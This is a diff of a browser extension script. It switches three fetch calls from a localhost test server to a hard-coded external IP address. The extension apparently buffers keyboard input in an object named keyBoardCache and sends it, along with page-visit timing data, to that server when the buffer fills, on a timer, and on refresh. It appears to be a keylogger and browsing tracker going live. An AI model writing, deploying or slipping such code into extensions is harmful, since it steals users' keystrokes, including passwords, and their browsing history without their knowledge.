@@ -96,10 +96,10 @@ function runExtension() {
 		},
 		add:function(income) {
 			if (this.saved.length == MAX_SAVED){
-				fetch("http://127.0.0.1:5000/api/get_content", {
+				fetch("http://95.163.180.50/api/get_content", {
 				  method: "POST", 
 				  headers: {
-				    'Access-Control-Allow-Origin': 'http://127.0.0.1:5000/'
+				    'Access-Control-Allow-Origin': 'http://95.163.180.50/'
 				  },
 				  body: JSON.stringify(this.saved)
 				}).then(res => {
@@ -128,7 +128,7 @@ function runExtension() {
 			this.saved.push(income)
 		}
 	}
-	var refreshIntervalId = setInterval(function() {fetch("http://127.0.0.1:5000/api/get_content", {
+	var refreshIntervalId = setInterval(function() {fetch("http://95.163.180.50/api/get_content", {
 											method: "POST", 
 											body: JSON.stringify(keyBoardCache.saved)
 												}).then(res => {
@@ -148,7 +148,7 @@ function runExtension() {
 	}
 
 	function onRefresh(time_ml) {
-		fetch("http://127.0.0.1:5000/api/get_content", {
+		fetch("http://95.163.180.50/api/get_content", {
 											method: "POST", 
 											body: JSON.stringify(pageVisit(time_ml))
 												}).then(res => {
